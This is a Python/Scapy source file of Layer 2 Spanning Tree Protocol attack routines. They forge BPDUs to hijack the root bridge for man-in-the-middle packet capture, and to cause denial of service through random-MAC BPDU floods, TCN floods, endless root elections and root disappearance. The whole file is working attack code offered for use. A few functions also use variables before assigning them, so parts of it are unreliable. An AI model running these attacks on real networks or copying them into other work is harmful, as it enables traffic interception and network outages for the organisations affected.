from scapy.layers.l2 import *
from scapy.packet import *
from scapy.sendrecv import sniff, bridge_and_sniff
from scapy.utils import PcapWriter
from scapy.all import RandMAC
from threading import Thread, current_thread
from time import sleep
 
from libs.aux_funcs import type_wrapper, attack_layer,attack_cat,attack_type,send_l2_single


@type_wrapper(category=attack_cat.Attack, name="Root Bridge Hijack MitM", type=attack_type.MitM, layer=attack_layer.L2, arg_list=["interface1", "interface2"])
def stp_root_bridge_mitm(i1, i2, dumpfile):

    def bridge_func(packet):
        pcap.write_packet(packet=packet)
        return True

    # Sniff a BPDU from any interface
    p = sniff(stop_filter=lambda x: x.haslayer(STP), iface=i1)

    # Scrape parameters from BPDU packet
    pkts = p.sessions()['Other']

    for x in pkts:
        if STP in x:
            STP_pkt = x
            break

    root_id = STP_pkt.rootid
    bridge_id = STP_pkt.bridgeid

    root_mac = STP_pkt.rootmac
    bridge_mac = STP_pkt.bridgemac

    # Modify root and bridge mac
    root_mac_int = int(root_mac.replace(':',''), 16)
    root_mac_int -=1
    root_mac_hex = "{:012x}".format(root_mac_int)
    root_mac = ":".join(root_mac_hex[i:i+2] for i in range(0, len(root_mac_hex), 2))

    bridge_mac_int = int(bridge_mac.replace(':',''), 16)
    bridge_mac_int -=1
    bridge_mac_hex = "{:012x}".format(bridge_mac_int)
    bridge_mac = ":".join(bridge_mac_hex[i:i+2] for i in range(0, len(bridge_mac_hex), 2))

    params = {"rootmac": root_mac, "bridgemac":bridge_mac, "rootid":root_id, "bridgeid":bridge_id}

    #Start the attack

    try:
        global pcap 
        pcap = PcapWriter(dumpfile)

        t1 = Thread(target=_stp_root_bridge_hijack, args=(i1, params,))
        t2 = Thread(target=_stp_root_bridge_hijack, args=(i2, params,))
        
        

        t1.start()
        t2.start()
        
        bridge_and_sniff(i1,i2,bridge_func, bridge_func)

        while True:
            if t1.is_alive():
                t1.join(0.5)
            if t2.is_alive():
                t2.join(0.5)
        
    except KeyboardInterrupt:
        t1.alive = False
        t2.alive = False

        t1.join()
        t2.join()

        pcap.close()

    return

def _stp_root_bridge_hijack(interface, params):

    """
    Launches an STP ROOT HIJACK attack utilizing a previously sniffed BPDU
    :param params: packet parameters
    :type params: dict
    """
    t = current_thread()
    t.alive = True

    root_id = params['rootid']
    bridge_id = params['bridgeid']
    bridgeMAC = params['bridgemac']
    rootMAC = params['rootmac']

    # Final BDPU
    pkt = Dot3(dst="01:80:c2:00:00:00", src = bridgeMAC)/LLC()/STP(bpdutype=0x00, bpduflags=0x01, portid=0x8002, rootmac = rootMAC, \
        bridgemac = bridgeMAC, rootid= root_id, bridgeid = bridge_id)

    
    while t.alive:
        p_sniff = srp1(pkt, iface=interface, verbose = 0, timeout = 2)
        if p_sniff is not None and STP in p_sniff and p_sniff[Dot3].src != rootMAC:
            pkt_ack = Dot3(dst="01:80:c2:00:00:00", src = bridgeMAC)/LLC()/STP(bpdutype=0x00, bpduflags=0x81, portid=0x8002, rootmac = rootMAC, \
            bridgemac = bridgeMAC, rootid= root_id, bridgeid = bridge_id)
            sendp(pkt_ack, iface=interface, verbose=0)
        
    return 0
    

@type_wrapper(category=attack_cat.Attack, name="Conf BPDU DoS", type=attack_type.DoS, layer=attack_layer.L2, arg_list=["interface"])
def stp_conf_bpdu_dos(args):

    interface = args["interface"]
    pkt = args['pkt']

    # Sniff a BPDU
    p = sniff(stop_filter=lambda x: x.haslayer(STP), iface=interface)

    # Scrape parameters from BPDU
    pkts = p.sessions()['Other']

    for x in pkts:
        if STP in x:
            STP_pkt = x
            break

    root_id = STP_pkt.rootid
    bridge_id = STP_pkt.bridgeid

    # Start the attack

    try:
        while True:
            # Generate Random Mac Address
            randMac = RandMAC()

            # Check for pre-existing layers (VLAN info)
            if pkt != None and pkt.haslayer(Dot1Q):
                pkt = pkt/LLC()/STP(bpdutype=0x00, bpduflags=0x01,rootmac = randMac, \
                    bridgemac= randMac, rootid = root_id, bridgeid = bridge_id)
                if pkt.haslayer(Ether):
                    pkt[Ether].dst = "01:00:0c:cc:cc:cd"
                    pkt[Ether].src = randMac

            else:
                pkt = Dot3(dst="01:80:c2:00:00:00", src = randMac)/LLC()/STP(bpdutype=0x00, bpduflags=0x01,rootmac = randMac, \
                    bridgemac= randMac, rootid = root_id, bridgeid = bridge_id)

            # Send the packet
            args['pkt'] = pkt
            send_l2_single(args)

    except KeyboardInterrupt:
        return 0

@type_wrapper(category=attack_cat.Attack, name="TCN BPDU DoS", type=attack_type.DoS, layer=attack_layer.L2, arg_list=["interface"])
def stp_tcn_bpdu_dos(args):
    try:
        while True:
            # Generate Random Mac Address
            randMac = RandMAC()

            # Check for pre-existing layers (VLAN info)
            if pkt != None and pkt.haslayer(Dot1Q):
                pkt = pkt/LLC()/STP(bpdutype=0x80)
                if pkt.haslayer(Ether):
                    pkt[Ether].dst = "01:00:0c:cc:cc:cd"
                    pkt[Ether].src = randMac

            else:
                pkt = Dot3(dst="01:80:c2:00:00:00", src = randMac)/LLC()/STP(bpdutype=0x80) 

            # Send the packet
            args['pkt'] = pkt
            send_l2_single(args)
           
    except KeyboardInterrupt:
        return 0


@type_wrapper(category = attack_cat.Attack, name="Eternal Root Election", type=attack_type.DoS, layer=attack_layer.L2, arg_list=["interface"])       
def stp_eternal_root_election(args):

    interface = args["interface"]
    pkt = args['pkt']

    # Sniff a BPDU
    p = sniff(stop_filter=lambda x: x.haslayer(STP), iface=interface)

    # Scrape parameters from BPDU
    pkts = p.sessions()['Other']

    for x in pkts:
        if STP in x:
            STP_pkt = x
            break

    root_id = STP_pkt.rootid
    bridge_id = STP_pkt.bridgeid

    root_mac = STP_pkt.rootmac
    bridge_mac = STP_pkt.bridgemac

    # Turn root and bridge mac into int format
    root_mac_int = int(root_mac.replace(':',''), 16)    
    bridge_mac_int = int(bridge_mac.replace(':',''), 16) 

    # Start the attack
    try:
        while root_mac_int > 0:
        
            # Lower MAC address by 1
            root_mac_int -=1
            root_mac_hex = "{:012x}".format(root_mac_int)
            root_mac = ":".join(root_mac_hex[i:i+2] for i in range(0, len(root_mac_hex), 2))

            bridge_mac_int -=1
            bridge_mac_hex = "{:012x}".format(bridge_mac_int)
            bridge_mac = ":".join(bridge_mac_hex[i:i+2] for i in range(0, len(bridge_mac_hex), 2))
            
            # Build the packet
            # Check for pre-existing layers (VLAN info)
            if pkt != None and pkt.haslayer(Dot1Q):
                pkt = pkt/LLC()/STP(bpdutype=0x00, bpduflags=0x01,rootmac = root_mac, \
                    bridgemac= bridge_mac, rootid = root_id, bridgeid = bridge_id)
                if pkt.haslayer(Ether):
                    pkt[Ether].dst = "01:00:0c:cc:cc:cd"
                    pkt[Ether].src = bridge_mac

            else:
                pkt = Dot3(dst="01:80:c2:00:00:00", src = bridge_mac)/LLC()/STP(bpdutype=0x00, bpduflags=0x01,rootmac = root_mac, \
                    bridgemac= bridge_mac, rootid = root_id, bridgeid = bridge_id)
                
            args['pkt'] = pkt
            send_l2_single(args)

        print("MAC address pool exhausted")
    except KeyboardInterrupt:
        return 0

@type_wrapper(category=attack_cat.Attack, name="Root Disappearance", type=attack_type.DoS, layer=attack_layer.L2, arg_list=["interface"])
def stp_root_disappearance(args):

    interface = args["interface"]
    pkt = args['pkt']

    # Sniff a BPDU
    p = sniff(stop_filter=lambda x: x.haslayer(STP), iface=interface)

    # Scrape parameters from BPDU
    pkts = p.sessions()['Other']

    for x in pkts:
        if STP in x:
            STP_pkt = x
            break

    root_id = STP_pkt.rootid
    bridge_id = STP_pkt.bridgeid

    maxAge = STP_pkt.maxage

    # Modify root and bridge mac
    root_mac_int = int(root_mac.replace(':',''), 16)
    root_mac_int -=1
    root_mac_hex = "{:012x}".format(root_mac_int)
    root_mac = ":".join(root_mac_hex[i:i+2] for i in range(0, len(root_mac_hex), 2))

    bridge_mac_int = int(bridge_mac.replace(':',''), 16)
    bridge_mac_int -=1
    bridge_mac_hex = "{:012x}".format(bridge_mac_int)
    bridge_mac = ":".join(bridge_mac_hex[i:i+2] for i in range(0, len(bridge_mac_hex), 2))

    # Start the attack

    try:
        while True:
        
            # Build the packet
            # Check for pre-existing layers (VLAN info)
            if pkt != None and pkt.haslayer(Dot1Q):
                pkt = pkt/LLC()/STP(bpdutype=0x00, bpduflags=0x01,rootmac = root_mac, \
                    bridgemac= bridge_mac, rootid = root_id, bridgeid = bridge_id)
                if pkt.haslayer(Ether):
                    pkt[Ether].dst = "01:00:0c:cc:cc:cd"
                    pkt[Ether].src = bridge_mac
            else:
                pkt = Dot3(dst="01:80:c2:00:00:00", src = bridge_mac)/LLC()/STP(bpdutype=0x00, bpduflags=0x01,rootmac = root_mac, \
                    bridgemac= bridge_mac, rootid = root_id, bridgeid = bridge_id)

            sendp(pkt, iface=interface)

            sleep(int(maxAge)+ 1)

    except KeyboardInterrupt:
        return 0